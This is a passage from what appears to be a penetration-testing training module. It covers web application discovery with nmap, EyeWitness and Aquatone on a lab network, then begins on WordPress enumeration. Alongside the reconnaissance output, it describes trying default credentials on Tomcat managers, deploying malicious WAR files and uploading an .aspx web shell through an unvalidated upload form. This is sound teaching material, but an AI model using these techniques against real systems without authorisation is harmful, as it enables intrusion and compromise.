Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> app-dev.inlanefreight.local (<span class="hljs-number">10.129</span>.<span class="hljs-number">201.58</span>)
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.12</span>s latency).
<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">993</span> closed ports
<span class="hljs-keyword">PORT</span>     STATE SERVICE
<span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh
<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http
<span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">open</span>  http-alt
<span class="hljs-number">8009</span>/tcp <span class="hljs-keyword">open</span>  ajp13
<span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http-proxy
<span class="hljs-number">8180</span>/tcp <span class="hljs-keyword">open</span>  unknown
<span class="hljs-number">8888</span>/tcp <span class="hljs-keyword">open</span>  sun-answerbook

Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> gitlab-dev.inlanefreight.local (<span class="hljs-number">10.129</span>.<span class="hljs-number">201.88</span>)
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.12</span>s latency).
<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">997</span> closed ports
<span class="hljs-keyword">PORT</span>     STATE SERVICE
<span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh
<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http
<span class="hljs-number">8081</span>/tcp <span class="hljs-keyword">open</span>  blackice-icecap

Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.50</span>
Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.13</span>s latency).
<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">991</span> closed ports
<span class="hljs-keyword">PORT</span>     STATE SERVICE
<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http
<span class="hljs-number">135</span>/tcp  <span class="hljs-keyword">open</span>  msrpc
<span class="hljs-number">139</span>/tcp  <span class="hljs-keyword">open</span>  netbios-ssn
<span class="hljs-number">445</span>/tcp  <span class="hljs-keyword">open</span>  microsoft-ds
<span class="hljs-number">3389</span>/tcp <span class="hljs-keyword">open</span>  ms-wbt-server
<span class="hljs-number">5357</span>/tcp <span class="hljs-keyword">open</span>  wsdapi
<span class="hljs-number">8000</span>/tcp <span class="hljs-keyword">open</span>  http-alt
<span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http-proxy
<span class="hljs-number">8089</span>/tcp <span class="hljs-keyword">open</span>  unknown

&lt;SNIP&gt;
</code></pre>
<p>As we can see, we identified several hosts running web servers on various ports. From the results, we can infer that one of the hosts is Windows and the remainder are Linux (but cannot be 100% certain at this stage). Pay particularly close attention to the hostnames as well. In this lab, we are utilizing Vhosts to simulate the subdomains of a company. Hosts with <code>dev</code> as part of the FQDN are worth noting down as they may be running untested features or have things like debug mode enabled. Sometimes the hostnames won&#39;t tell us too much, such as <code>app.inlanefreight.local</code>. We can infer that it is an application server but would need to perform further enumeration to identify which application(s) are running on it.</p>
<p>We would also want to add <code>gitlab-dev.inlanefreight.local</code> to our &quot;interesting hosts&quot; list to dig into once we complete the discovery phase. We may be able to access public Git repos that could contain sensitive information such as credentials or clues that may lead us to other subdomains/Vhosts. It is not uncommon to find Gitlab instances that allow us to register a user without requiring admin approval to activate the account. We may find additional repos after logging in. It would also be worth checking previous commits for data such as credentials which we will cover more in detail later in this module when we dig deeper into Gitlab.</p>
<p>Enumerating one of the hosts further using an Nmap service scan (<code>-sV</code>) against the default top 1,000 ports can tell us more about what is running on the webserver.</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap <span class="hljs-comment">--open -sV 10.129.201.50</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-07</span> <span class="hljs-number">21</span>:<span class="hljs-number">58</span> EDT
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.50</span>
Host is up (<span class="hljs-number">0.13</span>s latency).
Not shown: <span class="hljs-number">991</span> closed ports
PORT     STATE SERVICE       VERSION
<span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft IIS httpd <span class="hljs-number">10.0</span>
<span class="hljs-number">135</span>/tcp  <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">139</span>/tcp  <span class="hljs-built_in">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hljs-number">445</span>/tcp  <span class="hljs-built_in">open</span>  microsoft-ds?
<span class="hljs-number">3389</span>/tcp <span class="hljs-built_in">open</span>  ms-wbt-server Microsoft Terminal Services
<span class="hljs-number">5357</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)
<span class="hljs-number">8000</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Splunkd httpd
<span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Indy httpd <span class="hljs-number">17.3</span><span class="hljs-number">.33</span><span class="hljs-number">.2830</span> (Paessler PRTG bandwidth monitor)
<span class="hljs-number">8089</span>/tcp <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">http</span>      Splunkd httpd (free license; remote login disabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">38.63</span> <span class="hljs-built_in">seconds</span>
</code></pre>
<p>From the output above, we can see that an IIS web server is running on the default port 80, and it appears that <code>Splunk</code> is running on port 8000/8089, while <code>PRTG Network Monitor</code> is present on port 8080. If we were in a medium to large-sized environment, this type of enumeration would be inefficient. It could result in us missing a web application that may prove critical to the engagement&#39;s success.</p>
<hr>
<h3 id="using-eyewitness">Using EyeWitness</h3>
<p>First up is EyeWitness. As mentioned before, EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend <code>http://</code> and <code>https://</code> to the front of each. It will perform DNS resolution for IPs and can be given a specific set of ports to attempt to connect to and screenshot.</p>
<p>We can install EyeWitness via apt:</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt install eyewitness
</code></pre>
<p>or clone the <a href="https://github.com/FortyNorthSecurity/EyeWitness">repository</a>, navigate to the <code>Python/setup</code> directory and run the <code>setup.sh</code> installer script. EyeWitness can also be run from a Docker container, and a Windows version is available, which can be compiled using Visual Studio.</p>
<p>Running <code>eyewitness -h</code> will show us the options available to us:</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ eyewitness -h

usage: EyeWitness.py [<span class="hljs-comment">--web] [-f Filename] [-x Filename.xml]</span>
                     [<span class="hljs-comment">--single Single URL] [--no-dns] [--timeout Timeout]</span>
                     [<span class="hljs-comment">--jitter # of Seconds] [--delay # of Seconds]</span>
                     [<span class="hljs-comment">--threads # of Threads]</span>
                     [<span class="hljs-comment">--max-retries Max retries on a timeout]</span>
                     [-d Directory Name] [<span class="hljs-comment">--results Hosts Per Page]</span>
                     [<span class="hljs-comment">--no-prompt] [--user-agent User Agent]</span>
                     [<span class="hljs-comment">--difference Difference Threshold]</span>
                     [<span class="hljs-comment">--proxy-ip 127.0.0.1] [--proxy-port 8080]</span>
                     [<span class="hljs-comment">--proxy-type socks5] [--show-selenium] [--resolve]</span>
                     [<span class="hljs-comment">--add-http-ports ADD_HTTP_PORTS]</span>
                     [<span class="hljs-comment">--add-https-ports ADD_HTTPS_PORTS]</span>
                     [<span class="hljs-comment">--only-ports ONLY_PORTS] [--prepend-https]</span>
                     [<span class="hljs-comment">--selenium-log-path SELENIUM_LOG_PATH] [--resume ew.db]</span>
                     [<span class="hljs-comment">--ocr]</span>

EyeWitness is <span class="hljs-keyword">a</span> tool used <span class="hljs-built_in">to</span> capture screenshots <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> URLs

Protocols:
  <span class="hljs-comment">--web                 HTTP Screenshot using Selenium</span>

Input Options:
  -f Filename           Line-separated <span class="hljs-built_in">file</span> containing URLs <span class="hljs-built_in">to</span> capture
  -x Filename.xml       Nmap XML <span class="hljs-keyword">or</span> .Nessus <span class="hljs-built_in">file</span>
  <span class="hljs-comment">--single Single URL   Single URL/Host to capture</span>
  <span class="hljs-comment">--no-dns              Skip DNS resolution when connecting to websites</span>

Timing Options:
  <span class="hljs-comment">--timeout Timeout     Maximum number of seconds to wait while requesting a</span>
                        web page (Default: <span class="hljs-number">7</span>)
  <span class="hljs-comment">--jitter # of Seconds</span>
                        Randomize URLs <span class="hljs-keyword">and</span> <span class="hljs-built_in">add</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">random</span> delay between requests
  <span class="hljs-comment">--delay # of Seconds  Delay between the opening of the navigator and taking</span>
                        <span class="hljs-keyword">the</span> screenshot
  <span class="hljs-comment">--threads # of Threads</span>
                        Number <span class="hljs-keyword">of</span> threads <span class="hljs-built_in">to</span> use <span class="hljs-keyword">while</span> <span class="hljs-keyword">using</span> <span class="hljs-built_in">file</span> based input
  <span class="hljs-comment">--max-retries Max retries on a timeout</span>
                        Max retries <span class="hljs-keyword">on</span> <span class="hljs-title">timeouts</span>

&lt;SNIP&gt;
</code></pre>
<p>Let&#39;s run the default <code>--web</code> option to take screenshots using the Nmap XML output from the discovery scan as input.</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https:<span class="hljs-comment">//www.fortynorthsecurity.com           #</span>
################################################################################

Starting Web Requests (<span class="hljs-number">26</span> Hosts)
Attempting to screenshot http:<span class="hljs-comment">//app.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//app-dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//app-dev.inlanefreight.local:8000</span>
Attempting to screenshot http:<span class="hljs-comment">//app-dev.inlanefreight.local:8080</span>
Attempting to screenshot http:<span class="hljs-comment">//gitlab-dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//10.129.201.50</span>
Attempting to screenshot http:<span class="hljs-comment">//10.129.201.50:8000</span>
Attempting to screenshot http:<span class="hljs-comment">//10.129.201.50:8080</span>
Attempting to screenshot http:<span class="hljs-comment">//dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins-dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins-dev.inlanefreight.local:8000</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins-dev.inlanefreight.local:8080</span>
Attempting to screenshot http:<span class="hljs-comment">//support-dev.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//drupal-dev.inlanefreight.local</span>
[*] Hit timeout limit when connecting to http:<span class="hljs-comment">//10.129.201.50:8000, retrying</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins.inlanefreight.local:8000</span>
Attempting to screenshot http:<span class="hljs-comment">//jenkins.inlanefreight.local:8080</span>
Attempting to screenshot http:<span class="hljs-comment">//support.inlanefreight.local</span>
[*] Completed <span class="hljs-number">15</span> out <span class="hljs-keyword">of</span> <span class="hljs-number">26</span> services
Attempting to screenshot http:<span class="hljs-comment">//drupal-qa.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//web01.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//web01.inlanefreight.local:8000</span>
Attempting to screenshot http:<span class="hljs-comment">//web01.inlanefreight.local:8080</span>
Attempting to screenshot http:<span class="hljs-comment">//inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//drupal-acc.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//drupal.inlanefreight.local</span>
Attempting to screenshot http:<span class="hljs-comment">//blog-dev.inlanefreight.local</span>
Finished <span class="hljs-keyword">in</span> <span class="hljs-number">57.859838008880615</span> seconds

[*] Done! Report written <span class="hljs-keyword">in</span> the /home/mrb3n/Projects/inlanfreight/inlanefreight_eyewitness folder!
Would you like to open the report now? [Y/n]
</code></pre>
<hr>
<h3 id="using-aquatone">Using Aquatone</h3>
<p><a href="https://github.com/michenriksen/aquatone">Aquatone</a>, as mentioned before, is similar to EyeWitness and can take screenshots when provided a <code>.txt</code> file of hosts or an Nmap <code>.xml</code> file with the <code>-nmap</code> flag. We can compile Aquatone on our own or download a precompiled binary. After downloading the binary, we just need to extract it, and we are ready to go.</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/github.com/michenriksen</span><span class="hljs-regexp">/aquatone/releases</span><span class="hljs-regexp">/download/v</span>1.<span class="hljs-number">7.0</span>/aquatone_linux_amd64_1.<span class="hljs-number">7.0</span>.zip
</code></pre>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ unzip aquatone_linux_amd64_1.<span class="hljs-number">7.0</span><span class="hljs-selector-class">.zip</span> 

Archive:  aquatone_linux_amd64_1.<span class="hljs-number">7.0</span><span class="hljs-selector-class">.zip</span>
  inflating: aquatone                
  inflating: README<span class="hljs-selector-class">.md</span>               
  inflating: LICENSE.txt
</code></pre>
<p>We can move it to a location in our <code>$PATH</code> such as <code>/usr/local/bin</code> to be able to call the tool from anywhere or just drop the binary in our working (say, scans) directory. It&#39;s personal preference but typically most efficient to build our attack VMs with most tools available to use without having to constantly change directories or call them from other directories.</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ echo $PATH

<span class="hljs-regexp">/home/</span>mrb3n<span class="hljs-regexp">/.local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/snap/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span>sandbox<span class="hljs-regexp">/:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/games:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/sbin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/local/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>games
</code></pre>
<p>In this example, we provide the tool the same <code>web_discovery.xml</code> Nmap output specifying the <code>-nmap</code> flag, and we&#39;re off to the races.</p>
<p>Application Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat web_discovery.xml | ./</span>aquatone -nmap

aquatone v1<span class="hljs-number">.7</span><span class="hljs-number">.0</span> started at <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-07</span><span class="hljs-string">T22:</span><span class="hljs-number">31</span>:<span class="hljs-number">03</span><span class="hljs-number">-04</span>:<span class="hljs-number">00</span>

<span class="hljs-string">Targets    :</span> <span class="hljs-number">65</span>
<span class="hljs-string">Threads    :</span> <span class="hljs-number">6</span>
<span class="hljs-string">Ports      :</span> <span class="hljs-number">80</span>, <span class="hljs-number">443</span>, <span class="hljs-number">8000</span>, <span class="hljs-number">8080</span>, <span class="hljs-number">8443</span>
Output <span class="hljs-string">dir :</span> .
<span class="hljs-symbol">
http:</span><span class="hljs-comment">//web01.inlanefreight.local:8000/: 403 Forbidden</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app.inlanefreight.local/: 200 OK</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//jenkins.inlanefreight.local/: 403 Forbidden</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local/: 200 </span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local/: 200 </span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local:8000/: 403 Forbidden</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//jenkins.inlanefreight.local:8000/: 403 Forbidden</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//web01.inlanefreight.local:8080/: 200 </span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local:8000/: 403 Forbidden</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//10.129.201.50:8000/: 200 OK</span>

&lt;SNIP&gt;
<span class="hljs-symbol">
http:</span><span class="hljs-comment">//web01.inlanefreight.local:8000/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app.inlanefreight.local/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//jenkins.inlanefreight.local/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local:8000/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//jenkins.inlanefreight.local:8000/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local:8000/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app-dev.inlanefreight.local:8080/: screenshot successful</span>
<span class="hljs-string">http:</span><span class="hljs-comment">//app.inlanefreight.local/: screenshot successful</span>

&lt;SNIP&gt;

Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...<span class="hljs-string">Time:</span>
 - Started <span class="hljs-string">at  :</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-07</span><span class="hljs-string">T22:</span><span class="hljs-number">31</span>:<span class="hljs-number">03</span><span class="hljs-number">-04</span>:<span class="hljs-number">00</span>
 - Finished <span class="hljs-string">at :</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-07</span><span class="hljs-string">T22:</span><span class="hljs-number">31</span>:<span class="hljs-number">36</span><span class="hljs-number">-04</span>:<span class="hljs-number">00</span>
 - <span class="hljs-string">Duration    :</span> <span class="hljs-number">33</span>s
<span class="hljs-symbol">
Requests:</span>
 - <span class="hljs-string">Successful :</span> <span class="hljs-number">65</span>
 - <span class="hljs-string">Failed     :</span> <span class="hljs-number">0</span>

 - <span class="hljs-number">2</span><span class="hljs-string">xx :</span> <span class="hljs-number">47</span>
 - <span class="hljs-number">3</span><span class="hljs-string">xx :</span> <span class="hljs-number">0</span>
 - <span class="hljs-number">4</span><span class="hljs-string">xx :</span> <span class="hljs-number">18</span>
 - <span class="hljs-number">5</span><span class="hljs-string">xx :</span> <span class="hljs-number">0</span>
<span class="hljs-symbol">
Screenshots:</span>
 - <span class="hljs-string">Successful :</span> <span class="hljs-number">65</span>
 - <span class="hljs-string">Failed     :</span> <span class="hljs-number">0</span>

Wrote HTML report <span class="hljs-string">to:</span> aquatone_report.html
</code></pre>
<hr>
<h3 id="interpreting-the-results">Interpreting the Results</h3>
<p>Even with the 26 hosts above, this report will save us time. Now imagine an environment with 500 or 5,000 hosts! After opening the report, we see that the report is organized into categories, with <code>High Value Targets</code> being first and typically the most &quot;juicy&quot; hosts to go after. I have run EyeWitness in very large environments and generated reports with hundreds of pages that take hours to go through. Often, the very large reports will have interesting hosts buried deep within them, so it is worth reviewing the entire thing and poking at/researching any applications we are unfamiliar with. I found the <code>ManageEngine OpManager</code> application mentioned in the introduction section buried deep into a very large report during an external penetration test. This instance was left configured with the default credentials <code>admin:admin</code> and left wide open to the internet. I was able to log in and achieve code execution by running a PowerShell script. The OpManager application was running in the context of a Domain Admin account which led to full compromise of the internal network.</p>
<p>In the below report, I would be immediately excited to see Tomcat on any assessment (but especially during an External Penetration Test) and would try default credentials on the <code>/manager</code> and <code>/host-manager</code> endpoints. If we can access either, we can upload a malicious WAR file and achieve remote code execution on the underlying host using <a href="https://en.wikipedia.org/wiki/Jakarta\_Server\_Pages">JSP code</a>. More on this later in the module.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/eyewitness4.png" alt="image"></p>
<p>Continuing through the report, it looks like the main <code>http://inlanefreight.local</code> website is next. Custom web applications are always worth testing as they may contain a wide variety of vulnerabilities. Here I would also be interested to see if the website was running a popular CMS such as WordPress, Joomla, or Drupal. The next application, <code>http://support-dev.inlanefreight.local</code>, is interesting because it appears to be running <a href="https://osticket.com/">osTicket</a>, which has suffered from various severe vulnerabilities over the years. Support ticketing systems are of particular interest because we may be able to log in and gain access to sensitive information. If social engineering is in scope, we may be able to interact with customer support personnel or even manipulate the system to register a valid email address for the company&#39;s domain which we may be able to leverage to gain access to other services.</p>
<p>This last piece was demonstrated in the HTB weekly release box <a href="https://0xdf.gitlab.io/2021/05/22/htb-delivery.html">Delivery</a> by <a href="https://www.youtube.com/watch?v=gbs43E71mFM">IppSec</a>. This particular box is worth studying as it shows what is possible by exploring the built-in functionality of certain common applications. We will cover osTicket more in-depth later in this module.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/eyewitness3.png" alt="image"></p>
<p>During an assessment, I would continue reviewing the report, noting down interesting hosts, including the URL and application name/version for later. It is important at this point to remember that we are still in the information gathering phase, and every little detail could make or break our assessment. We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report. During an External Penetration Test, I would expect to see a mix of custom applications, some CMS, perhaps applications such as Tomcat, Jenkins, and Splunk, remote access portals such as Remote Desktop Services (RDS), SSL VPN endpoints, Outlook Web Access (OWA), O365, perhaps some sort of edge network device login page, etc.</p>
<p>Your mileage may vary, and sometimes we will come across applications that absolutely should not be exposed, such as a single page with a file upload button I encountered once with a message that stated, &quot;Please only upload .zip and .tar.gz files&quot;. I, of course, did not heed this warning (as this was in-scope during a client-sanctioned penetration test) and proceeded to upload a test <code>.aspx</code> file. To my surprise, there was no sort of client-side or back-end validation, and the file appeared to upload. Doing some quick directory brute-forcing, I was able to locate a <code>/files</code> directory that had directory listing enabled, and my <code>test.aspx</code> file was there. From here, I proceeded to upload a <code>.aspx</code> web shell and gained a foothold into the internal environment. This example shows that we should leave no stone unturned and that there can be an absolute treasure trove of data for us in our application discovery data.</p>
<p>During an Internal Penetration Test, we will see much of the same but often also see many printer login pages (which we can sometimes leverage to obtain cleartext LDAP credentials), ESXi and vCenter login portals, iLO and iDRAC login pages, a plethora of network devices, IoT devices, IP phones, internal code repositories, SharePoint and custom intranet portals, security appliances, and much more.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Now that we&#39;ve worked through our application discovery methodology and set up our notetaking structure let&#39;s deep dive into some of the most common applications that we will encounter time and time again. Please note that this module cannot possibly cover every single application that we will face. Rather, we aim to cover very prevalent ones and learn about common vulnerabilities, misconfigurations, and abusing their built-in functionality.</p>
<p>I can guarantee that you will face at least a few, if not all, of these applications during your career as a penetration tester. The methodology and mindset of exploring these applications are even more important, which we will develop and enhance throughout this module and test out during the skills assessments at the end. Many testers have great technical skills but soft skills such as a sound, and repeatable, methodology along with organization, attention to detail, strong communication, and thorough notetaking/documentation and reporting can set us apart and help to build confidence in our skillsets from both our employers as well as our clients.</p>
<h2 id="wordpress-discovery-enumeration">WordPress - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://wordpress.org/">WordPress</a>, launched in 2003, is an open-source Content Management System (CMS) that can be used for multiple purposes. It’s often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.</p>
<p>At the time of writing, WordPress accounts for around 32.5% of all sites on the internet and is the most popular CMS by market share. Here are some interesting <a href="https://hostingtribunal.com/blog/wordpress-statistics/">facts</a> about WordPress.</p>
<ul>
<li>WordPress offers over 50,000 plugins and over 4,100 GPL-licensed themes</li>
<li>317 separate versions of WordPress have been released since its initial launch</li>
<li>Roughly 661 new WordPress websites are built every day</li>
<li>WordPress blogs are written in over 120 languages</li>
<li>A study showed that roughly 8% of WordPress hacks happen due to weak passwords, while 60% were due to an outdated WordPress version</li>
<li>According to WPScan, out of nearly 4,000 known vulnerabilities, 54% are from plugins, 31.5% are from WordPress core, and 14.5% are from WordPress themes.</li>
<li>Some major brands that use WordPress include The New York Times, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz, and many more</li>
</ul>
<p>As we can see from these statistics, WordPress is extremely prevalent on the internet and presents a vast attack surface. We are guaranteed to come across WordPress during many of our External Penetration Test assessments, and we must understand how it works, how to enumerate it, and the various ways it can be attacked.</p>
<p>The <a href="https://academy.hackthebox.com/course/preview/hacking-wordpress">Hacking WordPress</a> module on HTB Academy goes very far in-depth on the structure and function of WordPress and ways it can be abused.</p>
<p>Let us imagine that during an external penetration test, we come across a company that hosts its main website based on WordPress. Like many other applications, WordPress has individual files that allow us to identify that application. Also, the files, folder structure, file names, and functionality of each PHP script can be used to discover even the installed version of WordPress. In this web application, by default, metadata is added by default in the HTML source code of the web page, which sometimes even already contains the version. Therefore, let us see what possibilities we have to find out more detailed information about WordPress.</p>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>A quick way to identify a WordPress site is by browsing to the <code>/robots.txt</code> file. A typical robots.txt on a WordPress installation may look like:</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">User-<span class="hljs-string">agent:</span> *
<span class="hljs-string">Disallow:</span> <span class="hljs-regexp">/wp-admin/</span>
<span class="hljs-string">Allow:</span> <span class="hljs-regexp">/wp-admin/</span>admin-ajax.php
<span class="hljs-string">Disallow:</span> <span class="hljs-regexp">/wp-content/</span>uploads<span class="hljs-regexp">/wpforms/</span>
<span class="hljs-symbol">
Sitemap:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//inlanefreight.local/wp-sitemap.xml</span>
</code></pre>
<p>Here the presence of the <code>/wp-admin</code> and <code>/wp-content</code> directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the <code>wp-admin</code> directory will redirect us to the <code>wp-login.php</code> page. This is the login portal to the WordPress instance&#39;s back-end.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/wp-login2.png" alt=""></p>
<p>WordPress stores its plugins in the <code>wp-content/plugins</code> directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the <code>wp-content/themes</code> directory. These files should be carefully enumerated as they may lead to RCE.</p>
<p>There are five types of users on a standard WordPress installation.</p>
<ol>
<li>Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</li>
<li>Editor: An editor can publish and manage posts, including the posts of other users.</li>
<li>Author: They can publish and manage their own posts.</li>
<li>Contributor: These users can write and manage their own posts but cannot publish them.</li>
<li>Subscriber: These are standard users who can browse posts and edit their profiles.</li>
</ol>
<p>Getting access to an administrator is usually sufficient to obtain code execution on the server. Editors and authors might have access to certain vulnerable plugins, which normal users don’t.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Another quick way to identify a WordPress site is by looking at the page source. Viewing the page with <code>cURL</code> and grepping for <code>WordPress</code> can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. We can enumerate WordPress using a variety of manual and automated tactics.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ curl -s http://blog.inlanefreight.<span class="hljs-keyword">local</span> | grep WordPress

&lt;meta name=<span class="hljs-string">"generator"</span> content=<span class="hljs-string">"WordPress 5.8"</span> /
</code></pre>
<p>Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts. We should spend some time manually browsing the site and looking through the page source for each page, grepping for the <code>wp-content</code> directory, <code>themes</code> and <code>plugin</code>, and begin building a list of interesting data points.</p>
<p>Looking at the page source, we can see that the <a href="https://wordpress.org/themes/business-gravity/">Business Gravity</a> theme is in use. We can go further and attempt to fingerprint the theme version number and look for any known vulnerabilities that affect it.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/blog.inlanefreight.local/</span> | grep themes

